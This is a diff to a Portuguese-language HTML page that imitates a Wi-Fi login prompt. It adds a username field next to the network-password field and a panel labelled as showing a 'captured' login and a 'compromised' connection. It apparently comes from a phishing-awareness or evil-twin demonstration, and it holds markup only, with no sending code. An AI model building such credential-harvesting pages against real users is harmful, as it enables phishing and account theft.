@@ -44,6 +44,23 @@
 
       <form id="wifi-form" class="wifi-form" onsubmit="return false;">
         <div class="wifi-input-group">
+          <label for="wifi-login-input" class="wifi-label">Login / Usuário:</label>
+          <div class="wifi-input-wrapper">
+            <input 
+              type="text" 
+              id="wifi-login-input" 
+              class="wifi-input" 
+              placeholder="Digite seu login, e-mail ou nome..." 
+              autocomplete="username"
+              autofocus
+            >
+          </div>
+          <div id="wifi-login-error" class="wifi-error-msg hidden">
+            ⚠️ Por favor, digite seu login.
+          </div>
+        </div>
+
+        <div class="wifi-input-group">
           <label for="wifi-password-input" class="wifi-label">Senha da Rede:</label>
           <div class="wifi-password-wrapper">
             <input 
@@ -51,8 +68,7 @@
               id="wifi-password-input" 
               class="wifi-input" 
               placeholder="Digite a senha..." 
-              autocomplete="off"
-              autofocus
+              autocomplete="current-password"
             >
             <button type="button" id="wifi-toggle-pass" class="wifi-toggle-pass" title="Mostrar/Ocultar Senha">
               👁️
@@ -100,6 +116,14 @@
         <div class="info-item">
           <span class="label">Sistema:</span>
           <span id="dev-os" class="value">Identificando...</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Login Capturado:</span>
+          <span id="dev-login" class="value alert-color">Interceptando...</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Status da Conexão:</span>
+          <span id="dev-status" class="value alert-color">Comprometida (Porta 443)</span>
         </div>
         <div class="info-item">
           <span class="label">Endereço IP:</span>
